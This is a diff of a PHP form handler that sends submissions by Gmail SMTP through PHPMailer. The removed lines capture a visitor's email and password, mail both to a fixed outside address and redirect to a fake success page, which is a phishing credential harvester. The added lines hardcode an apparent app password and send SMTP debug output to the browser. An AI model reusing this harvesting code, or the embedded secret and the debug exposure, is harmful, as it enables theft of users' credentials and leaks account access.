@@ -3,43 +3,46 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
+// Inclure PHPMailer
 require 'src/PHPMailer.php';
 require 'src/SMTP.php';
 require 'src/Exception.php';
 
+// Récupération des données (ex: formulaire simple)
 $email_user = $_POST['email'] ?? '';
-$pass_user = $_POST['password'] ?? '';
 
-if($email_user && $pass_user){
+if ($email_user) {
 
     $mail = new PHPMailer(true);
 
     try {
-        // CONFIG SMTP (Gmail ici)
-        $mail->isSMTP();
-        $mail->Host = 'smtp.gmail.com';
-        $mail->SMTPAuth = true;
-        $mail->Username = 'TON_EMAIL@gmail.com';
-        $mail->Password = 'MOT_DE_PASSE_APPLICATION';
-        $mail->SMTPSecure = 'tls';
-        $mail->Port = 587;
+        // DEBUG (affiche les erreurs si problème)
+        $mail->SMTPDebug = 2;
+        $mail->Debugoutput = 'html';
 
-        // Expéditeur et destinataire
-        $mail->setFrom('TON_EMAIL@gmail.com', 'Test');
+        // CONFIG SMTP Gmail
+        $mail->isSMTP();
+        $mail->Host       = 'smtp.gmail.com';
+        $mail->SMTPAuth   = true;
+        $mail->Username   = 'TON_EMAIL@gmail.com';
+        $mail->Password   = 'vlukzvylbqenkhzx'; // ton mot de passe d’application
+        $mail->SMTPSecure = 'tls';
+        $mail->Port       = 587;
+
+        // Expéditeur / destinataire
+        $mail->setFrom('TON_EMAIL@gmail.com', 'Formulaire Test');
         $mail->addAddress('pardogabinemail@gmail.com');
 
         // Contenu
-        $mail->Subject = 'Test formulaire';
-        $mail->Body = "Email: $email_user\nMot de passe: $pass_user";
+        $mail->Subject = 'Test formulaire OK';
+        $mail->Body    = "Un formulaire a été soumis.\nEmail: $email_user";
 
         $mail->send();
+
+        echo "Email envoyé avec succès";
 
     } catch (Exception $e) {
         echo "Erreur: {$mail->ErrorInfo}";
     }
 }
-
-// Redirection
-header('Location: index.html?success=1');
-exit;
 ?>
